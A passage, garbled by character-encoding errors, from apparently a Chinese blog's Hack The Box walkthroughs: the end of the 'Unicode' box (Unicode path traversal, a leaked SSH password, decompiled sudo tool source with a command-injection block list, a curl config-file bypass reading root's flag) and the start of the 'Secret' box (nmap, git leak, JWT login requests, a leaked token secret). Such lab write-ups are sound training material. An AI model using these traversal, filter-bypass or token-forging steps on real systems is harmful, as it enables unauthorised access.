ï¼Œä½†ä¸çŸ¥é“mysqlè·¯å¾„åœ¨å“ª\n\n![](Hackthebox-Unicode/31bbfb38-fec6-4f5b-8496-2f726ef6e4d8.png)\n\næˆ‘ä»¬çŸ¥é“nginxåœ¨è¿™å°é¶æœºä¸Šè¿è¡Œç€å‘¢ï¼Œè¯•ç€å»è¯»å–ä¸€ä¸‹nginxçš„é…ç½®æ–‡ä»¶\n\n```bash\nhttp://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/nginx/sites-available/default\n```\n![](Hackthebox-Unicode/4eac2bc5-4915-4efb-98c1-535bc8d099e7.png)\n\n```bash\nhttp://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/home/code/coder/db.yaml\n```\næˆ‘ä»¬åœ¨nginxçš„é…ç½®æ–‡ä»¶é‡Œå¾—åˆ°äº†ä¸€ä¸ªè·¯å¾„\n\n![](Hackthebox-Unicode/a22ff1cd-556b-4feb-8971-f8cb49cd4821.png)\n\nå¾—åˆ°äº†codeçš„ç”¨æˆ·å¯†ç ï¼Œç„¶ååœ¨passwdé‡Œæˆ‘ä¼¼ä¹çœ‹åˆ°codeç”¨æˆ·æœ‰sshæƒé™ï¼Œå»å°è¯•ä¸€ä¸‹\n\n```bash\nusername = code\npassword = B3stC0d3r2021@@!\n```\n```bash\ncode@code:~$ whoami&&id\ncode\nuid=1000(code) gid=1000(code) groups=1000(code)\n```\nOKï¼Œæ‹¿åˆ°useræƒé™çš„shelläº†\n\n```bash\ncode@code:~$ ls\ncoder  user.txt\ncode@code:~$ cat user.txt \n280ae5b99ba2b4de934bbd3b7f0fb0fd\n```\næ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶\n\n## æƒé™æå‡\n```bash\ncode@code:~$ sudo -l\nMatching Defaults entries for code on code:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser code may run the following commands on code:\n    (root) NOPASSWD: /usr/bin/treport\n```\nsudo -lçœ‹åˆ°æœ‰ä¸€ä¸ªå¯ä»¥å…å¯†ç rootæƒé™æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ‰§è¡Œä¸€ä¸‹çœ‹çœ‹ä»€ä¹ˆæ•ˆæœ\n\n```bash\ncode@code:~$ sudo /usr/bin/treport\n1.Create Threat Report.\n2.Read Threat Report.\n3.Download A Threat Report.\n4.Quit.\nEnter your choice:\n```\nå¥½åƒæ˜¯ä¸ªå¨èƒæŠ¥å‘Šç”Ÿæˆçš„ï¼Ÿ\n\nå…ˆæ­£å¸¸ä½¿ç”¨ä¸€ä¸‹åŠŸèƒ½çœ‹çœ‹\n\n```bash\ncode@code:~$ sudo /usr/bin/treport\n1.Create Threat Report.\n2.Read Threat Report.\n3.Download A Threat Report.\n4.Quit.\nEnter your choice:1\nEnter the filename:lucifiel\nEnter the report:lucifiel\nEnter your choice:2\nALL THE THREAT REPORTS:\nlucifiel\n\nEnter the filename:3\nSOMETHING IS WRONG\n\nEnter your choice:3\nEnter the IP/file_name:lucifiel\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: lucifiel\nEnter your choice:lucifiel||whoami\nWrong Input\ncode@code:~$ sudo /usr/bin/treport\n1.Create Threat Report.\n2.Read Threat Report.\n3.Download A Threat Report.\n4.Quit.\nEnter your choice:4\ncode@code:~$ sudo /usr/bin/treport\n1.Create Threat Report.\n2.Read Threat Report.\n3.Download A Threat Report.\n4.Quit.\nEnter your choice:3\nEnter the IP/file_name:^CTraceback (most recent call last):\n  File \"treport.py\", line 79, in <module>\n  File \"treport.py\", line 43, in download\nKeyboardInterrupt\n[1431] Failed to execute script 'treport' due to unhandled exception!\n```\néšä¾¿ä½¿ç”¨äº†äº†ä¸€ä¸‹åŠŸèƒ½ï¼Œå‘ç°ä¸‹è½½åŠŸèƒ½ä¼¼ä¹æ˜¯ä½¿ç”¨äº†curlè¿›è¡Œè¯»å–ï¼Œå¹¶ä¸”è°ƒç”¨äº†pythonæ–‡ä»¶ï¼Œè¿™é‡Œä½¿ç”¨å·¥å…·ç»™æå–å‡ºpythonè„šæœ¬çœ‹ä¸€ä¸‹\n\n> [https://github.com/LucifielHack/pyinstxtractor](https://github.com/LucifielHack/pyinstxtractor)\n\né¦–å…ˆä½¿ç”¨scpå°†äºŒè¿›åˆ¶æ–‡ä»¶ä¸‹è½½ä¸‹æ¥\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/pyinstxtractor]\nâ””â”€# scp code@10.10.11.126:/usr/bin/treport ./\ncode@10.10.11.126's password: \ntreport\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/pyinstxtractor]\nâ””â”€# python3 pyinstxtractor.py treport                                    \n[+] Processing treport\n[+] Pyinstaller version: 2.1+\n[+] Python version: 38\n[+] Length of package: 6798297 bytes\n[+] Found 46 files in CArchive\n[+] Beginning extraction...please standby\n[+] Possible entry point: pyiboot01_bootstrap.pyc\n[+] Possible entry point: pyi_rth_pkgutil.pyc\n[+] Possible entry point: pyi_rth_multiprocessing.pyc\n[+] Possible entry point: pyi_rth_inspect.pyc\n[+] Possible entry point: treport.pyc\n[!] Warning: This script is running in a different Python version than the one used to build the executable.\n[!] Please run this script in Python38 to prevent extraction errors during unmarshalling\n[!] Skipping pyz extraction\n[+] Successfully extracted pyinstaller archive: treport\n\nYou can now use a python decompiler on the pyc files within the extracted directory\n```\n> [https://github.com/LucifielHack/pycdc](https://github.com/LucifielHack/pycdc)\n\nè¿™é‡Œä½¿ç”¨ä¸€ä¸ªpyå’Œc++çš„åç¼–è¯‘å·¥å…·\n\nè¿›å…¥ç›®å½•\n\n```bash\ncmake CMakeLists.txt\né€‰æ‹©y\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/pyinstxtractor/pycdc]\nâ””â”€# cmake CMakeLists.txt                                                                                                                                                                                        2 â¨¯\n-- The C compiler identification is GNU 10.2.1\n-- The CXX compiler identification is GNU 10.2.1\n-- Detecting C compiler ABI info\n-- Detecting C compiler ABI info - done\n-- Check for working C compiler: /usr/bin/cc - skipped\n-- Detecting C compile features\n-- Detecting C compile features - done\n-- Detecting CXX compiler ABI info\n-- Detecting CXX compiler ABI info - done\n-- Check for working CXX compiler: /usr/bin/c++ - skipped\n-- Detecting CXX compile features\n-- Detecting CXX compile features - done\n-- Found PythonInterp: /usr/bin/python (found version \"2.7.18\") \n-- Configuring done\n-- Generating done\n-- Build files have been written to: /root/Desktop/pyinstxtractor/pycdc\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/pyinstxtractor/pycdc]\nâ””â”€# make\n[  2%] Generating bytes/python_10.cpp, bytes/python_11.cpp, bytes/python_13.cpp, bytes/python_14.cpp, bytes/python_15.cpp, bytes/python_16.cpp, bytes/python_20.cpp, bytes/python_21.cpp, bytes/python_22.cpp, bytes/python_23.cpp, bytes/python_24.cpp, bytes/python_25.cpp, bytes/python_26.cpp, bytes/python_27.cpp, bytes/python_30.cpp, bytes/python_31.cpp, bytes/python_32.cpp, bytes/python_33.cpp, bytes/python_34.cpp, bytes/python_35.cpp, bytes/python_36.cpp, bytes/python_37.cpp, bytes/python_38.cpp, bytes/python_39.cpp, bytes/python_310.cpp                                                                                              \n[  4%] Building CXX object CMakeFiles/pycxx.dir/bytecode.cpp.o\n[  7%] Building CXX object CMakeFiles/pycxx.dir/data.cpp.o\n[  9%] Building CXX object CMakeFiles/pycxx.dir/pyc_code.cpp.o\n[ 12%] Building CXX object CMakeFiles/pycxx.dir/pyc_module.cpp.o\n[ 14%] Building CXX object CMakeFiles/pycxx.dir/pyc_numeric.cpp.o\n[ 17%] Building CXX object CMakeFiles/pycxx.dir/pyc_object.cpp.o\n[ 19%] Building CXX object CMakeFiles/pycxx.dir/pyc_sequence.cpp.o\n[ 21%] Building CXX object CMakeFiles/pycxx.dir/pyc_string.cpp.o\n[ 24%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_10.cpp.o\n[ 26%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_11.cpp.o\n[ 29%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_13.cpp.o\n[ 31%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_14.cpp.o\n[ 34%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_15.cpp.o\n[ 36%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_16.cpp.o\n[ 39%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_20.cpp.o\n[ 41%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_21.cpp.o\n[ 43%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_22.cpp.o\n[ 46%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_23.cpp.o\n[ 48%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_24.cpp.o\n[ 51%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_25.cpp.o\n[ 53%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_26.cpp.o\n[ 56%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_27.cpp.o\n[ 58%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_30.cpp.o\n[ 60%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_31.cpp.o\n[ 63%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_32.cpp.o\n[ 65%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_33.cpp.o\n[ 68%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_34.cpp.o\n[ 70%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_35.cpp.o\n[ 73%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_36.cpp.o\n[ 75%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_37.cpp.o\n[ 78%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_38.cpp.o\n[ 80%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_39.cpp.o\n[ 82%] Building CXX object CMakeFiles/pycxx.dir/bytes/python_310.cpp.o\n[ 85%] Linking CXX static library libpycxx.a\n[ 85%] Built target pycxx\n[ 87%] Building CXX object CMakeFiles/pycdas.dir/pycdas.cpp.o\n[ 90%] Linking CXX executable pycdas\n[ 90%] Built target pycdas\n[ 92%] Building CXX object CMakeFiles/pycdc.dir/pycdc.cpp.o\n[ 95%] Building CXX object CMakeFiles/pycdc.dir/ASTree.cpp.o\n[ 97%] Building CXX object CMakeFiles/pycdc.dir/ASTNode.cpp.o\n[100%] Linking CXX executable pycdc\n[100%] Built target pycdc\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/pyinstxtractor/pycdc]\nâ””â”€# ./pycdc /root/Desktop/pyinstxtractor/treport_extracted/treport.pyc \n# Source Generated with Decompyle++\n# File: treport.pyc (Python 3.9)\n\nUnsupported opcode: <255>\nimport os\nimport sys\nfrom datetime import datetime\nimport re\n\nclass threat_report:\n\n    def create(self):\nUnsupported opcode: <255>\n        file_name = input('Enter the filename:')\n        content = input('Enter the report:')\n        if '../' in file_name:\n            print('NOT ALLOWED')\n            sys.exit(0)\n        file_path = '/root/reports/' + file_name\n    # WARNING: Decompyle incomplete\n\n\n    def list_files(self):\n        file_list = os.listdir('/root/reports/')\n        files_in_dir = ' '.join((lambda .0: [ str(elem) for elem in .0 ])(file_list))\n        print('ALL THE THREAT REPORTS:')\n        print(files_in_dir)\n\n\n    def read_file(self):\nUnsupported opcode: <255>\n        file_name = input('\\nEnter the filename:')\n        if '../' in file_name:\n            print('NOT ALLOWED')\n            sys.exit(0)\n        contents = ''\n        file_name = '/root/reports/' + file_name\n    # WARNING: Decompyle incomplete\n\n\n    def download(self):\n        now = datetime.now()\n        current_time = now.strftime('%H_%M_%S')\n        command_injection_list = [\n            '$',\n            '`',\n            ';',\n            '&',\n            '|',\n            '||',\n            '>',\n            '<',\n            '?',\n            \"'\",\n            '@',\n            '#',\n            '$',\n            '%',\n            '^',\n            '(',\n            ')']\n        ip = input('Enter the IP/file_name:')\n        res = bool(re.search('\\\\s', ip))\n        if res:\n            print('INVALID IP')\n            sys.exit(0)\n        if 'file' in ip and 'gopher' in ip or 'mysql' in ip:\n            print('INVALID URL')\n            sys.exit(0)\n        cmd = '/bin/bash -c \"curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '\"'\n        os.system(cmd)\n\n# WARNING: Decompyle incomplete\n```\né€šè¿‡åˆ†æä¸Šè¿°æºç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨curlå‘½ä»¤æ¥ä¸‹è½½ï¼Œä½†æ˜¯ä½¿ç”¨äº†è¿‡æ»¤ï¼Œæƒ³åŠæ³•æ„é€ è¯­å¥ç»•è¿‡ä¸€ä¸‹å³å¯\n\n```bash\ncode@code:~$ sudo /usr/bin/treport\n1.Create Threat Report.\n2.Read Threat Report.\n3.Download A Threat Report.\n4.Quit.\nEnter your choice:3\nEnter the IP/file_name:{--config,/root/root.txt}\nWarning: /root/root.txt:1: warning: '2f935df00d52a1b17035600df088e81d' is \nWarning: unknown\ncurl: no URL specified!\ncurl: try 'curl --help' or 'curl --manual' for more information\n```\nç›´æ¥ä½¿ç”¨ä¸‹è½½ï¼Œå¹¶æ„é€ æ¶æ„è¯­å¥è¯»å–æŒ‡å®šçš„æ–‡ä»¶å³å¯ï¼ŒæˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Secret - Hackthebox","url":"/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/","content":"\n# Hackthebox - Secret\n## **é¶åœºä¿¡æ¯**\n![](Hackthebox-Secret/image1.png)\n\n## **é¶åœºç±»å‹**\n![](Hackthebox-Secret/image2.png)\n\n## **ä¿¡æ¯æœé›†**\né¦–å…ˆè¿›è¡Œç«¯å£æ‰«æ\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.120\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 02:09 EST\nNmap scan report for 10.10.11.120\nHost is up (0.40s latency).\nNot shown: 65532 closed ports\nPORT Â  Â  STATE SERVICE VERSION\n22/tcp Â  open  ssh Â  Â  OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n| Â  3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)\n| Â  256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)\n|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)\n80/tcp Â  open  http Â   nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: DUMB Docs\n3000/tcp open  http Â   Node.js (Express middleware)\n|_http-title: DUMB Docs\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=11/8%OT=22%CT=1%CU=33102%PV=Y%DS=2%DC=T%G=Y%TM=6188CD7\nOS:B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ\nOS:(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O\nOS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=\nOS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN\nOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 995/tcp)\nHOP RTT Â  Â  Â  ADDRESS\n1 Â  851.60 ms 10.10.14.1\n2 Â  713.96 ms 10.10.11.120\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 80.73 seconds\n```\nç»è¿‡æŸ¥çœ‹åå‘ç°`80`ç«¯å£å’Œ`3000`ç«¯å£å†…å®¹ä¸€è‡´\n\nå’±ä»¬å»çœ‹çœ‹`80`ç«¯å£çš„å†…å®¹\n\n![](Hackthebox-Secret/image3.png)\n\nè¿™å¥½åƒæ˜¯ä¸€ä¸ªæ–‡ä»¶ç®¡ç†æœåŠ¡å™¨ä¹‹ç±»çš„ä»€ä¹ˆä¸œè¥¿çš„ï¼Ÿå’±è‹±æ–‡ä¸å¥½ï¼Œå’±ä¹Ÿä¸çŸ¥é“ï¼Œå’±ä¹Ÿä¸æ•¢é—®\n\nå³ä¸Šè§’æœ‰ä¸ªæŒ‰é’®`Live Demo`ï¼Œåæ­£ç‚¹äº†ä¹Ÿä¸ä¼šçˆ†ç‚¸ï¼Œç‚¹ç‚¹çœ‹å‘—\n\n![](Hackthebox-Secret/image4.png)\n\nè¿™æ˜¯APIæ¥å£å•Šï¼Œä½†æ˜¯å¥½åƒæ²¡æœ‰å†…å®¹ï¼Œå’±ä»¬å¾€ä¸‹çœ‹çœ‹\n\n![](Hackthebox-Secret/image5.png)\n\nè¿™é‡Œå¥½åƒæ˜¯å¯ä»¥ä¸‹è½½æºä»£ç ï¼Œç®¡ä»–çš„å…ˆä¸‹è½½ä¸‹æ¥çœ‹çœ‹å‘—\n\n![](Hackthebox-Secret/image6.png)\n\nè¿™åº”è¯¥æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œç„¶åè¿˜æœ‰gitæ–‡ä»¶æ³„éœ²ï¼Œé‚£å°±å…ˆä¸‹è½½ä¸‹æ¥å˜›\n\n> https://github.com/LucifielHack/GitTools\n\nä¸‹è½½ä¸‹æ¥ååˆ©ç”¨ä¸€ä¸‹\n\n```Plain Text\n/root/Desktop/GitTools/Extractor/extractor.sh local-web/ dump\n```\nå†…å®¹æ¯”è¾ƒå¤šï¼Œå’±ä»¬ç­‰ä»–å…ˆä¸‹è½½å®Œå§ï¼Œç­‰çš„æ—¶å€™å¯ä»¥å»çœ‹ä¼šå„¿è§†é¢‘\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump]\nâ””â”€# ls -la\næ€»ç”¨é‡ 32\ndrwxr-xr-x 8 root root 4096 11æœˆ 29 20:53 .\ndrwxr-xr-x 6 root root 4096 11æœˆ 29 20:47 ..\ndrwxr-xr-x 7 root root 4096 11æœˆ 29 20:48 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb\ndrwxr-xr-x 7 root root 4096 11æœˆ 29 20:50 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8\ndrwxr-xr-x 7 root root 4096 11æœˆ 29 20:51 2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b\ndrwxr-xr-x 7 root root 4096 11æœˆ 29 20:52 3-de0a46b5107a2f4d26e348303e76d85ae4870934\ndrwxr-xr-x 7 root root 4096 11æœˆ 29 20:53 4-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78\ndrwxr-xr-x 7 root root 4096 11æœˆ 29 20:54 5-3a367e735ee76569664bf7754eaaade7c735d702\n```\nå®Œæˆåå¯ä»¥çœ‹åˆ°æœ‰æå–å‡ºå…­æ¬¡æ•°æ®ï¼Œå’±ä»¬éšä¾¿è¿›ä¸€ä¸ªçœ‹çœ‹\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb]\nâ””â”€# ls -la\næ€»ç”¨é‡ 116\ndrwxr-xr-x Â  7 root root  4096 11æœˆ 29 20:48 .\ndrwxr-xr-x Â  8 root root  4096 11æœˆ 29 20:53 ..\n-rw-r--r-- Â  1 root root Â  219 11æœˆ 29 20:47 commit-meta.txt\n-rw-r--r-- Â  1 root root Â  174 11æœˆ 29 20:47 .env\n-rw-r--r-- Â  1 root root Â  885 11æœˆ 29 20:47 index.js\ndrwxr-xr-x Â  2 root root  4096 11æœˆ 29 20:47 model\ndrwxr-xr-x 201 root root  4096 11æœˆ 29 20:48 node_modules\n-rw-r--r-- Â  1 root root Â  491 11æœˆ 29 20:48 package.json\n-rw-r--r-- Â  1 root root 69452 11æœˆ 29 20:48 package-lock.json\ndrwxr-xr-x Â  3 root root  4096 11æœˆ 29 20:48 public\ndrwxr-xr-x Â  2 root root  4096 11æœˆ 29 20:48 routes\ndrwxr-xr-x Â  4 root root  4096 11æœˆ 29 20:48 src\n-rw-r--r-- Â  1 root root Â  651 11æœˆ 29 20:48 validations.js\n```\nå¯ä»¥ç¡®å®šæ˜¯ä¸€ä¸ªæºç åº“äº†ï¼Œçªç ´å£åœ¨`/routes/auto.js`ä¸­\n\n```Plain Text\nconst router = require('express').Router();\nconst User = require('../model/user');\nconst bcrypt = require('bcryptjs')\nconst jwt = require('jsonwebtoken')\nconst { registerValidation, loginValidation} = require('../validations')\n\nrouter.post('/register', async (req, res) => {\n\n Â   // validation\n Â   const { error } = registerValidation(req.body)\n Â   if (error) return res.status(400).send(error.details[0].message);\n\n Â   // check if user exists\n Â   const emailExist = await User.findOne({email:req.body.email})\n Â   if (emailExist) return res.status(400).send('Email already Exist')\n\n Â   // check if user name exist\n Â   const unameexist = await User.findOne({ name: req.body.name })\n Â   if (unameexist) return res.status(400).send('Name already Exist')\n\n Â   //hash the password\n Â   const salt = await bcrypt.genSalt(10);\n Â   const hashPaswrod = await bcrypt.hash(req.body.password, salt)\n\n Â   //create a user\n Â   const user = new User({\n Â  Â  Â   name: req.body.name,\n Â  Â  Â   email: req.body.email,\n Â  Â  Â   password:hashPaswrod\n Â   });\n\n Â   try{\n Â  Â  Â   const saveduser = await user.save();\n Â  Â  Â   res.send({ user: user.name})\n\n Â   }\n Â   catch(err){\n Â  Â  Â   console.log(err)\n Â   }\n\n});\n\n// login\n\nrouter.post('/login', async  (req , res) => {\n\n Â   const { error } = loginValidation(req.body)\n Â   if (error) return res.status(400).send(error.details[0].message);\n\n Â   // check if email is okay\n Â   const user = await User.findOne({ email: req.body.email })\n Â   if (!user) return res.status(400).send('Email is wrong');\n\n Â   // check password\n Â   const validPass = await bcrypt.compare(req.body.password, user.password)\n Â   if (!validPass) return res.status(400).send('Password is wrong');\n\n Â   // create jwt\n Â   const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )\n Â   res.header('auth-token', token).send(token);\n\n})\n\nrouter.use(function (req, res, next) {\n Â   res.json({\n Â  Â  Â   message: {\n\n Â  Â  Â  Â  Â   message: \"404 page not found\",\n Â  Â  Â  Â  Â   desc: \"page you are looking for is not found. \"\n Â  Â  Â   }\n Â   })\n});\n\nmodule.exports = router\n```\nè¿™æ˜¯`auto.js` å†…çš„æºç ï¼Œå¯ä»¥çœ‹å‡ºæ¥æœ‰`/register`æ¥è¯·æ±‚å®ƒ\n\né¦–å…ˆæ·»åŠ ä¸€ä¸ªDNSè§£æ\n\n```Plain Text\necho 10.10.11.120 secret.htb >> /etc/hosts\n```\næ„é€ ä¸€ä¸ªpayloadæ¥æ³¨å†Œç”¨æˆ·\n\n```Plain Text\ncurl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{\"name\": \"lucifiel\",\"email\": \"lucifiel@lucifiel.com\",\"password\": \"123456\"}'\n```\nç„¶åä½¿ç”¨æ³¨å†Œçš„ç”¨æˆ·è¿›è¡Œç™»å½•\n\n```Plain Text\ncurl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/login --data '{\"email\": \"lucifiel@lucifiel.com\",\"password\": \"123456\"}'\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# curl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/login --data '{\"email\": \"lucifiel@lucifiel.com\",\"password\": \"123456\"}'\nNote: Unnecessary use of -X or --request, POST is already inferred.\n* Â  Trying 10.10.11.120:80...\n* Connected to secret.htb (10.10.11.120) port 80 (#0)\n> POST /api/user/login HTTP/1.1\n> Host: secret.htb\n> User-Agent: curl/7.74.0\n> Accept: */*\n> Content-Type: application/json\n> Content-Length: 55\n>\n* upload completely sent off: 55 out of 55 bytes\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n< Server: nginx/1.18.0 (Ubuntu)\n< Date: Mon, 06 Dec 2021 06:28:56 GMT\n< Content-Type: text/html; charset=utf-8\n< Content-Length: 216\n< Connection: keep-alive\n< X-Powered-By: Express\n< auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM\n< ETag: W/\"d8-L4wZphXtP/sfJQE0ke71PfuUMnY\"\n<\n* Connection #0 to host secret.htb left intact\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM\n```\næˆåŠŸç™»å½•å¹¶è·å–åˆ°token\n\næŸ¥çœ‹å¹¶åˆ†æ`/routes/verifytoken.js`æ–‡ä»¶çš„å†…å®¹\n\n```Plain Text\nconst jwt = require(\"jsonwebtoken\");\n\nmodule.exports = function (req, res, next) {\n Â   const token = req.header(\"auth-token\");\n Â   if (!token) return res.status(401).send(\"Access Denied\");\n\n Â   try {\n Â  Â  Â   const verified = jwt.verify(token, process.env.TOKEN_SECRET);\n Â  Â  Â   req.user = verified;\n Â  Â  Â   next();\n Â   } catch (err) {\n Â  Â  Â   res.status(400).send(\"Invalid Token\");\n Â   }\n};\n```\næˆ‘ä»¬çŸ¥é“äº†JWTä»¤ç‰Œçš„éªŒè¯è¿‡ç¨‹ï¼Œé‚£æˆ‘ä»¬å°±æ„é€ ä¸€ä¸ªpayloadæŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬å½“å‰çš„æƒé™\n\n```Plain Text\ncurl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM'\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# curl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM'\n{\"role\":{\"role\":\"you are normal user\",\"desc\":\"lucifiel\"}}\n```\nå¾—åˆ°å›åŒ…ï¼Œæˆ‘ä»¬æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·æƒé™\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb]\nâ””â”€# cat .env\nDB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'\nTOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE\n```\næŸ¥çœ‹æ 